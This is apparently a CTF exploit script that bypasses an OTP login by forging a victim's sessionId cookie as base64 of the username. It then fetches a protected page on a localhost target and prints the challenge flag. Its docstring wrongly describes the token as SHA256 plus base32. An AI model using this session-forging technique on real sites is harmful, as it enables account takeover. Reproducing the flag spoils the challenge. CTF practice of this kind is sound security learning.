#!/usr/bin/env python3
"""
CTF OTP Challenge - Exploit Script
Demonstrates the sessionId bypass vulnerability:
1. SessionId is predictable based on username (SHA256 + base32)
2. Can craft victim's sessionId without knowing OTP
3. Access protected resource and capture the flag
"""

import requests
from hashlib import sha256

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def log_info(msg):
    print(f"{Colors.BLUE}[*]{Colors.RESET} {msg}")

def log_success(msg):
    print(f"{Colors.GREEN}[+]{Colors.RESET} {msg}")

def log_error(msg):
    print(f"{Colors.RED}[-]{Colors.RESET} {msg}")

def create_session_id(username):
    """
    Recreate the sessionId using base64 encoding of username
    This is the vulnerability - sessionId is just base64(username)!
    """
    import base64
    return base64.b64encode(username.encode()).decode()

def exploit(target_url, victim_username):
    """
    Exploit the sessionId bypass vulnerability
    """
    print(f"\n{Colors.BOLD}{Colors.RED}=== CTF OTP Challenge - SessionId Bypass Exploit ==={Colors.RESET}\n")
    
    session = requests.Session()
    
    # Step 1: Craft the victim's sessionId
    log_info(f"Step 1: Crafting sessionId for victim '{victim_username}'")
    victim_session_id = create_session_id(victim_username)
    log_success(f"Crafted sessionId: {Colors.BOLD}{victim_session_id}{Colors.RESET}")
    
    # Step 2: Access protected resource with crafted sessionId (without knowing OTP!)
    log_info(f"Step 2: Accessing protected resource with crafted sessionId")
    
    try:
        # Set the crafted sessionId as a cookie
        session.cookies.set('sessionId', victim_session_id)
        
        response = session.get(
            f"{target_url}/protected_resource"
        )
        
        if response.status_code == 200:
            log_success("✓ Protected resource accessed!")
            
            # Extract flag from HTML
            if 'OTP{ACC$$S_BYPAS$$D}' in response.text:
                log_success(f"✓ FLAG FOUND!")
                log_success(f"Flag: {Colors.BOLD}{Colors.YELLOW}OTP{{ACC$$S_BYPAS$$D}}{Colors.RESET}")
            elif 'Attacker has entered' in response.text:
                log_success(f"Accessed as attacker account")
            
            print(f"\n{Colors.BOLD}{Colors.GREEN}[SUCCESS] Exploitation complete!{Colors.RESET}\n")
            return True
        else:
            log_error(f"Failed to access resource: {response.status_code}")
            return False
            
    except Exception as e:
        log_error(f"Exception: {str(e)}")
        return False

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="CTF OTP Challenge - SessionId Bypass Exploit")
    parser.add_argument("--url", default="http://localhost:3000", help="Target URL")
    parser.add_argument("--victim", default="carlos", help="Victim username")
    
    args = parser.parse_args()
    
    success = exploit(args.url, args.victim)
    exit(0 if success else 1)
